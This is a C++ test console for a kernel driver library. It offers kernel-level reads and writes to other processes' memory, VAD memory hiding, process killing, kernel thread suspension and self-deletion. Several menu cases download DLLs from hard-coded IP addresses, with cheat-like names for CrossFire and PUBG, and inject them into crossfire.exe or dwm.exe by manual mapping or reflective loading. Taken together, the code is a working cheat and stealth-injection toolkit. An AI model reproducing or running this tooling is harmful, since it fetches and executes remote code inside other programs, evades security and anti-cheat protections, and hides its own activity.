//////////////////////////////////////////////////////////////////////////////////////////////////////////
//										Demo程序，测试驱动时简单的调用示例
//////////////////////////////////////////////////////////////////////////////////////////////////////////
#include "main.h"
#include "CrashDump/CrashDump.h"

#include "../GN-Driver-Lib/Driver/Driver.h"
#pragma comment(lib,"Driver/GN-Driver-Lib.lib")

#define OutputDebugStringA_1Param(fmt,var) {CHAR sOut[256];CHAR sfmt[50];sprintf_s(sfmt,"%s%s","",fmt);sprintf_s(sOut,(sfmt),var);OutputDebugStringA(sOut);}
#define OutputDebugStringA_2Param(fmt,var1,var2) {CHAR sOut[256];CHAR sfmt[50];sprintf_s(sfmt,"%s%s","",fmt);sprintf_s(sOut,(sfmt),var1,var2);OutputDebugStringA(sOut);}
#define OutputDebugStringA_3Param(fmt,var1,var2,var3) {CHAR sOut[256];CHAR sfmt[50];sprintf_s(sfmt,"%s%s","",fmt);sprintf_s(sOut,(sfmt),var1,var2,var3);OutputDebugStringA(sOut);}

Driver drv;
std::string dll_buffer;
int dll_buffer_size = 0;


//BOOL UpPermissions()
//{
//	HANDLE hToken;
//	TOKEN_PRIVILEGES pTP;
//	LUID uID;
//	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
//	{
//		MessageBox(NULL, L"初始化调整进程权限发生错误！", L"温馨提示", 0);
//		return FALSE;
//	}
//	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &uID))
//	{
//		MessageBox(NULL, L"遍历进程权限发生错误！", L"温馨提示", 0);
//		return FALSE;
//	}
//	pTP.PrivilegeCount = 1;
//	pTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
//	pTP.Privileges[0].Luid = uID;
//	if (!AdjustTokenPrivileges(hToken, FALSE, &pTP, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
//	{
//		MessageBox(NULL, L"提升进程权限时发生错误！", L"温馨提示", 0);
//		return FALSE;
//	}
//	return TRUE;
//}

void Menu()
{
	printf("\n\n");
	printf("0:加载驱动\n");
	printf("1:卸载驱动\n");
	printf("3:通过内核模块名称获取内核地址\n");
	printf("4:设置内存属性\n");
	printf("5:设置内存隐藏属性\n");
	printf("6:申请普通内存\n");
	printf("7:读整数内存ByCR3\n");
	printf("8:读长整数内存ByCR3\n");
	printf("9:读单浮点数内存ByCR3\n");
	printf("10:写整数内存ByCR3\n");
	printf("11:写长整数内存ByCR3\n");
	printf("12:写单浮点数内存ByCR3\n");
	printf("13:写字节型内存ByCR3\n");
	printf("14:读整数内存ByMDL\n");
	printf("15:读长整数内存ByMDL\n");
	printf("16:读字节集内存ByMDL\n");
	printf("17:写整数内存ByMDL\n");
	printf("18:写长整数内存ByMDL\n");
	printf("19:写字节型内存ByMDL\n");
	printf("20:测试注入\n");
	printf("21:VAD隐藏内存\n");
	printf("22:测试下载\n");
	printf("23:杀掉进程\n");
	printf("24:注入dwm\n");
	printf("25:删除自身exe文件\n");
	printf("26:设置内存vad属性\n");
	printf("28:暂停内核线程\n");
	printf("29:测试注入\n");
	printf("30:加载\n");
	printf("31:注入\n");

}

int main()
{
	static bool first_call_statu = false;
	if (!first_call_statu)
	{
		CrashDump crash_dump;
		first_call_statu = true;
	}
	Menu();
	int select = 0;
	scanf("%d", &select);
	switch (select)
	{
	case 0:
	{
		//GetCurrentDirectoryA(4096, drv.sysfilepath);
		//strcat(drv.sysfilepath, "\\GN-Driver.sys");
		//char* driver_file_buffer = (char*)malloc(1024 * 1024 * 3);
		//int driver_file_buffer_size = 0;
		//int driver_file_buffer_http_head = 0;
		//driver_file_buffer_size = drv.DownLoadFile("112.18.159.36:456", "/RemoteFile/sys/GN-Driver.sys", driver_file_buffer, &driver_file_buffer_http_head, drv.sysfilepath);
		//if (driver_file_buffer_size > 0)
		//{
		//	sprintf_s(drv.sysfilename, "GN-Driver.sys");
		//	//drv.MyClearService(drv.sysfilename);
		//	drv.InstallSYS(drv.sysfilename, drv.sysfilepath);
		//}
		//else
		//	MessageBoxA(NULL, "驱动加载失败（文件下发失败,请检查网络连接）！", "警告", MB_OK);
		//if (driver_file_buffer)
		//	free(driver_file_buffer);

		bool status = drv.User_Call_InstallSYS();
		//bool status = drv.KdmapperInstallDriver();
		printf("驱动加载状态：%s\n", status ? "成功" : "失败");

		break;
	}
	case 1:
	{
		//drv.UninstallSYS(drv.sysfilename);

		printf("驱动卸载状态：%s\n", drv.User_Call_UninstallSYS() ? "成功" : "失败");

		break;
	}
	case 2:
		break;
	case 3:
	{
		WCHAR sys_module_name[500] = { NULL };
		printf("请输入需要获取的内核模块名称：\n");
		scanf("%S", &sys_module_name);
		printf("地址：%p\n", drv.GetKernelModuleHandle(sys_module_name));
		break;
	}
	case 4:
	{
		ULONG pid = 0;
		ULONG size = 0;
		DWORD64 address = 0;
		ULONG protect_attribute = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入目标地址：\n");
		scanf("%p", &address);
		printf("请输入修改地址大小：\n");
		scanf("%d", &size);
		printf("请输入新的内存属性：\n");
		scanf("%d", &protect_attribute);
		printf("返回值：%d\n", drv.SetMemoryProtectEx(pid, (PVOID)address, size, protect_attribute));
		break;
	}
	case 5:
	{
		ULONG pid = 0;
		ULONG64 address = 0;
		ULONG size = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入目标地址：\n");
		scanf("%p", &address);
		printf("请输入修改地址大小：\n");
		scanf("%d", &size);
		printf("返回值：%d\n", drv.SetExecutePageEx(pid, address, size));
		break;
	}
	case 6:
	{
		ULONG pid = 0;
		ULONG size = 0;
		ULONG protect = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入申请地址大小：\n");
		scanf("%d", &size);
		printf("请输入申请地址属性：\n");
		scanf("%d", &protect);
		printf("申请的地址：%p\n", (DWORD64)drv.AllocMemoryEx(pid, size, protect));
		break;
	}
	case 7:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入读取地址：\n");
		scanf("%p", &address);
		printf("内核读取到的数值：%p", drv.ReadIntByCR3NoAttachEx(pid, address));
		break;
	}
	case 8:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入读取地址：\n");
		scanf("%p", &address);
		printf("内核读取到的数值：%p", drv.ReadLongByCR3NoAttachEx(pid, address));
		break;
	}
	case 9:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入读取地址：\n");
		scanf("%p", &address);
		printf("内核读取到的数值：%f", drv.ReadFloatByCR3NoAttachEx(pid, address));
		break;
	}
	case 10:
	{
		ULONG pid = 0;
		PVOID address = 0;
		PVOID data = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入写入的地址：\n");
		scanf("%p", &address);
		printf("请输入需要写入的数据(十进制)：\n");
		scanf("%d", &data);
		printf("是否成功：%s", drv.WriteIntByCR3NoAttachEx(pid, address, (DWORD)data) ? "成功" : "失败");
		break;
	}
	case 11:
	{
		ULONG pid = 0;
		PVOID address = 0;
		DWORD64 data = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入写入的地址：\n");
		scanf("%p", &address);
		printf("请输入需要写入的数据(十六进制)：\n");
		scanf("%p", &data);
		printf("是否成功：%s", drv.WriteLongByCR3NoAttachEx(pid, address, (DWORD64)data) ? "成功" : "失败");
		break;
	}
	case 12:
	{
		ULONG pid = 0;
		PVOID address = 0;
		float data = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入写入的地址：\n");
		scanf("%p", &address);
		printf("请输入需要写入的数据(十进制小数)：\n");
		scanf("%f", &data);
		printf("是否成功：%s", drv.WriteFloatByCR3NoAttachEx(pid, address, data) ? "成功" : "失败");
		break;
	}
	case 13:
	{
		ULONG pid = 0;
		PVOID address = 0;
		BYTE* data = (BYTE*)malloc(1024 * 1024 * 1);

		memset(data, (int)(new BYTE[1024 * 1024 * 1]{ 0xAA }), 1024 * 1024 * 1);
		//BYTE data[5] = { 0xAA,0xBB,0xCC,0xDD,0xFF };
		//printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入写入的地址：\n");
		scanf("%p", &address);
		printf("写入状态：%s\n", drv.WriteBytesByCR3NoAttachEx(pid, address, &data, sizeof(data)) ? "成功" : "失败");
		//drv.WriteBytesByCR3Ex(pid, address, data, sizeof(data));

		free(data);
		break;
	}
	case 14:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入读取的地址：\n");
		scanf("%p", &address);
		printf("读取到的数据：%p\n", drv.ReadIntByMDLEx(pid, address));
		break;
	}
	case 15:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入读取的地址：\n");
		scanf("%p", &address);
		printf("读取到的数据：%p\n", drv.ReadLongByMDLEx(pid, address));
		break;
	}
	case 16:
	{
		ULONG pid = 0;
		PVOID address = 0;
		SIZE_T read_size = 0;
		BYTE read_buffer[8] = { NULL };

		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入读取的地址：\n");
		scanf("%p", &address);
		printf("请输入需要读取的长度：\n");
		scanf("%d", &read_size);

		printf("读取状态：%s\n", drv.ReadBytesByMDLEx(pid, address, read_size, read_buffer) ? "成功" : "失败");

		printf("读取到的数据：");
		for (int i = 0; i < read_size; i++)
		{
			printf("%02X ", read_buffer[i]);
		}
		printf("\n");

		break;
	}
	case 17:
	{
		ULONG pid = 0;
		PVOID address = 0;
		PVOID data = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入写入的地址：\n");
		scanf("%p", &address);
		printf("请输入需要写入的数据(十进制)：\n");
		scanf("%d", &data);
		printf("是否成功：%s", drv.WriteIntByMDLEx(pid, address, (DWORD)data) ? "成功" : "失败");
		break;
	}
	case 18:
	{
		ULONG pid = 0;
		PVOID address = 0;
		PVOID64 data = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入写入的地址：\n");
		scanf("%p", &address);
		printf("请输入需要写入的数据(十六进制)：\n");
		scanf("%p", &data);
		printf("是否成功：%s", drv.WriteLongByMDLEx(pid, address, (DWORD64)data) ? "成功" : "失败");
		break;
	}
	case 19:
	{
		ULONG pid = 0;
		PVOID address = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入写入的地址：\n");
		scanf("%p", &address);

		BYTE* data = (BYTE*)malloc(1048576);
		for (int i = 0; i < 1048576; i++)
		{
			data[i] = 5;
		}
		printf("写入状态：%s\n", drv.WriteBytesByMDLEx(pid, address, data, 1048576) ? "成功" : "失败");
		free(data);

		//BYTE data[6] = { 0x01,0x02,0x03,0x04,0x05,0x06 };
		//printf("写入状态：%s\n", drv.WriteBytesByMDLEx(pid, address, data, sizeof(data)) ? "成功" : "失败");

		break;
	}
	case 20:
	{
		//dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/TestDll.dll", dll_buffer, &dll_buffer_http_head);
		//dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/InstrumentationCallbackTest.dll", dll_buffer, &dll_buffer_http_head);
		//dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/ExceptionTest.dll", dll_buffer, &dll_buffer_http_head);
		dll_buffer_size = drv.DownLoadFile("221.236.21.196:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", &dll_buffer);
		//OutputDebugStringA_1Param("[GN]:dll文件大小：%d", dll_buffer_size);
		if (dll_buffer_size > 0)
		{
			//ULONG pid = drv.GetProcessPIDW(L"ShadowVolume.exe");
			//if (pid)
			//{
			//	drv.SetProcessID(pid);
			//	DWORD64 modulehandle = (DWORD64)drv.GetUserModuleHandleEx(pid, L"ShadowVolume.exe");
			//	if (modulehandle)
			//	{
			//		//const char* transfer_data = "这是效验的数据";
			//		//printf("注入状态：%d\n", drv.ReflectiveInject(modulehandle + 0x4FD07, 21, (LPBYTE)(dll_buffer + dll_buffer_http_head), dll_buffer_size, (PVOID)transfer_data, strlen(transfer_data) * 2));
			//		printf("注入状态：%d\n", drv.ManualMapInject(modulehandle + 0x4FD07, 21, (LPBYTE)(dll_buffer + dll_buffer_http_head), dll_buffer_size));
			//	}
			//	else
			//		printf("获取模块失败！\n");
			//}
			//else
			//	printf("获取pid失败\n");
			
			ULONG pid = drv.GetProcessPIDW(L"crossfire.exe");
			if (pid)
			{
				drv.SetProcessID(pid);
				DWORD64 modulehandle = (DWORD64)drv.GetUserModuleHandleEx(pid, L"crossfire.exe");
				if (modulehandle)
				{
					//const char* transfer_data = "这是效验的数据";
					//printf("注入状态：%d\n", drv.ReflectiveInject(modulehandle + 0x1BC244, 14, (LPBYTE)(dll_buffer + dll_buffer_http_head), dll_buffer_size, (PVOID)transfer_data, strlen(transfer_data) * 2));
					printf("注入状态：%d\n", drv.ManualMapInject(modulehandle + 0x1BC604, 14, (LPBYTE)(dll_buffer.data()), dll_buffer_size));
				}
				else
					printf("获取模块失败！\n");
			}
			else
				printf("获取pid失败\n");
		}
		else
			printf("下载文件失败！\n");

		break;
	}
	case 21:
	{
		ULONG pid = 0;
		ULONG64 address = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入需要隐藏的地址：\n");
		scanf("%p", &address);

		printf("隐藏状态：%s\n", drv.HideMemoryByVADEx(pid, address, 0) ? "成功" : "失败");
		break;
	}
	case 22:
	{
		char* driver_file_buffer = (char*)malloc(1024 * 1024 * 3);

		//int file_size = drv.DownLoadFileByCurl("112.18.159.36:456", L"/RemoteFile/sys/GN-Driver.sys", "GN-Driver1.sys");
		//OutputDebugStringA_1Param("[GN]:文件大小：%d", file_size);

		//int file_size = drv.DownLoadFileByCurl("112.18.159.36:456", L"/RemoteFile/sys/GN-Driver.sys", driver_file_buffer);
		//OutputDebugStringA_1Param("[GN]:文件大小：%d", file_size);
		//if (file_size > 0)
		//{
		//	FILE* fp = nullptr;
		//	fp = fopen("GN-Driver1.sys", "wb");//w:以文本方式写入，wb以二进制方式写入
		//	fwrite(driver_file_buffer, file_size, 1, fp);//写入到文件
		//	fclose(fp);
		//}


		if (driver_file_buffer)
			free(driver_file_buffer);

		break;
	}
	case 23:
	{
		ULONG pid = 0;
		printf("请输入想杀掉的进程id：\n");
		scanf("%d", &pid);
		printf("杀掉进程状态：%s\n", drv.KillProcess(pid) ? "成功" : "失败");
		break;
	}
	case 24:
	{
		//FARPROC addr = GetProcAddress(GetModuleHandleA("ntdll.dl"), "NtCreateThreadEx");
		//printf("地址：%p\n", addr);

		//UpPermissions();

		std::string dwm_dll_file;
		int dwm_dll_file_size = 0;

		//char dll_file_path[4096] = { NULL };
		//wchar_t temp_dll_file_path[4096 * 2];
		//GetCurrentDirectoryA(4096, dll_file_path);
		//strcat(dll_file_path, "\\dwm.dll");
		//OutputDebugStringA_1Param("[GN]:下载路径：%s", dll_file_path);
		//if (drv.DownLoadFile("112.18.159.26:456", "/RemoteFile/Resource/Resource_D_Debug.dll", dwm_dll_file, &dwm_dll_http_head, dll_file_path) > 0)
		//{
		//	drv.charTowchar(dll_file_path, temp_dll_file_path);
		//	printf("注入dwm状态：%s\n", drv.InjectByRemoteThreadEx(drv.GetProcessPIDW(L"dwm.exe"), temp_dll_file_path) ? "成功" : "失败");
		//}

		dwm_dll_file_size = drv.DownLoadFile("112.18.159.26:456", "/RemoteFile/Resource/Resource_D_Debug.dll", &dwm_dll_file);
		if (dwm_dll_file_size > 0)
		{
			printf("注入dwm状态：%s\n", drv.Original_ReflectiveInject(drv.GetProcessPIDW(L"dwm.exe"), dwm_dll_file.data(), dwm_dll_file_size, (PVOID)"Test_Data", strlen("Test_Data") + 1) ? "成功" : "失败");
		}

		break;
	}
	case 25:
	{
		WCHAR file_path[1024] = { NULL };
		WCHAR exe_file_name[MAX_PATH] = { NULL };

		GetCurrentDirectoryW(1024, file_path);

		printf("请输入exe文件名：\n");
		scanf("%S", exe_file_name);

		wcscat(file_path, L"\\");
		wcscat(file_path, exe_file_name);

		printf("删除状态：%s\n", drv.DeleteExecuteFile(file_path) ? "成功" : "失败");

		break;
	}
	case 26:
	{
		ULONG pid = 0;
		ULONG size = 0;
		DWORD64 address = 0;
		ULONG protect_attribute = 0;
		printf("请输入进程id：\n");
		scanf("%d", &pid);
		printf("请输入目标地址：\n");
		scanf("%p", &address);
		//printf("请输入修改地址大小：\n");
		//scanf("%d", &size);
		printf("请输入新的内存属性：\n");
		scanf("%d", &protect_attribute);
		printf("返回值：%d\n", drv.SetMemoryVADProtectionEx(pid, address, 0, protect_attribute));
		break;
	}
	case 28:
	{
		printf("暂停线程状态：%s\n", drv.SuspendKernelThread("ntoskrnl.exe","0") ? "成功" : "失败");
		int tid = 0;
		printf("请输入需要暂停的线程id：\n");
		scanf("%d", &tid);
		printf("线程暂停状态：%s\n", drv.SuspendKernelThreadByID("ntoskrnl.exe", (HANDLE)tid) ? "成功" : "失败");

		break;
	}
	case 29:
	{
		//printf("请输入需要注入的进程id(十进制)：\n");
		//ULONG pid = NULL;
		//scanf("%d", &pid);
				
		//下载dll
		std::string dll_file;
		int dll_file_size = 0;
		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-ReflectiveLoader-DLL-Demo.dll", &dll_file);
		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-DLL-PUBG.dll", &dll_file);
		dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", &dll_file);
		//dll_file_size = drv.DownLoadFile("118.123.202.72:456", "/RemoteFile/CF-CheatEngine.dll", &dll_file);
		if (dll_file_size > 0)
			printf("dll下载成功\n");
		else
			printf("dll下载失败！\n");

		while (true)
		{
			//HWND game_window_handle = ::FindWindowA("Direct3DWindowClass", "SubD11");
			HWND game_window_handle = ::FindWindowA("CrossFire", "穿越火线");
			if (game_window_handle != NULL)
			{
				//获取游戏真实pid
				int game_pid = NULL;
				::GetWindowThreadProcessId(game_window_handle, (LPDWORD)&game_pid);
				//int game_pid = drv->GetProcessPIDW(L"crossfire.exe");
				if (game_pid == NULL)
				{
					::MessageBoxA(::GetActiveWindow(), "未找到游戏！请启动游戏或重启系统后再试", "警告", MB_OK);
					exit(-1);
				}

				//进行注入操作 
				DWORD inject_value = drv.InjectByKernelHackThreadMemoryLoadEx(game_pid, (PVOID)dll_file.data(), dll_file_size, 3000, _ReadWriteModle::MDL);
				printf("注入状态：%s", inject_value ? "成功" : "失败");
				break;
			}
		}

		break;
	}
	case 30:
	{
		GetCurrentDirectoryA(4096, drv.sysfilepath);
		strcat(drv.sysfilepath, "\\InjectDriver.sys");
		sprintf_s(drv.sysfilename, "InjectDriver.sys");
		//drv.MyClearService(drv.sysfilename);
		drv.InstallSYS(drv.sysfilename, drv.sysfilepath);
		break;
	}
	case 31:
	{
		//下载dll
		std::string dll_file;
		int dll_file_size = 0;
		dll_file_size = drv.DownLoadFile("221.236.23.10:456", "/RemoteFile/GN-DLL-CF-IMGUI.dll", &dll_file);
		printf("下载大小：%d\n", dll_file_size);
		if (dll_file_size <= 0)
		{
			printf("dll下载失败！\n");
			break;
		}

		//内核通讯
		ULONG dwWrite;
		PVOID return_buffer = NULL;
		HANDLE hDevice = CreateFile(L"\\\\.\\GN_NewLinker", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		DeviceIoControl(hDevice, CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_IN_DIRECT, FILE_ANY_ACCESS), (PVOID)(dll_file.data()), dll_file_size, &return_buffer, sizeof(return_buffer), &dwWrite, NULL);
		CloseHandle(hDevice);

		break;
	}
	default:
		break;
	}
	main();
	return 0;
}


